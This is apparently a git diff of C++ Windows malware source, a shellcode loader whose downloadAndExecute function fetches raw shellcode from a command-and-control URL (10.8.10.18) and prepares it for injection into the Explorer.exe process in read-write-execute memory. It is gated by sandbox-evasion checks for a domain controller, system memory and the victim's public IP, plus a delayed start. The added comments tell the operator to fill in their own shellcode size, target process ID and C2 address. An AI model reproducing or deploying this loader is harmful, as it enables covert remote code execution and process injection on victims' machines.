@@ -16,19 +16,24 @@ using namespace std;
 int downloadAndExecute()
 {
     HANDLE hProcess;
+    //Update the dwSize variable with your shellcode size. This should be approximately 510 bytes
     SIZE_T dwSize = 510;
     DWORD flAllocationType = MEM_COMMIT | MEM_RESERVE;
     DWORD flProtect = PAGE_EXECUTE_READWRITE;
     LPVOID memAddr;
     SIZE_T bytesOut;
+    //Update the OpenProcess Windows API with your Explorer.exe Process ID. This can be found in Task Manager
     hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 924);
+    //Update the c2URL with your IP Address and the specific URI where your raw shellcode is stored.
     const char* c2URL = "http://10.8.10.18/index.raw";
     IStream* stream;
+    //Update the buff[] variable to include your shellcode size
     char buff[510];
     unsigned long bytesRead;
     string s;
     URLOpenBlockingStreamA(0, c2URL, &stream, 0, 0);
     while (true) {
+        //Update the Read file descriptor to include your shellcode size
         stream->Read(buff, 510, &bytesRead);
         if (0U == bytesRead) {
             break;
@@ -74,7 +79,7 @@ BOOL memoryCheck() {
 
 BOOL checkIP()
 {
-    const char* websiteURL = "https://ifconfig.me/HostIP";
+    const char* websiteURL = "https://ifconfig.me/HOSTIP";
     IStream* stream;
     string s;
     char buff[35];
@@ -87,7 +92,7 @@ BOOL checkIP()
         }
         s.append(buff, bytesRead);
     }
-    if (s == "Victim IP") {
+    if (s == "VICTIM_IP") {
         return TRUE;
     }
     else {
@@ -97,11 +102,12 @@ BOOL checkIP()
 
 
 int main() {
+    Sleep(60000);
     if (isDomainController() == TRUE) {
         if (memoryCheck() == TRUE)
         {
             if (checkIP() == TRUE) {
-                Sleep(60000);
+                
                 downloadAndExecute();
             }
         }
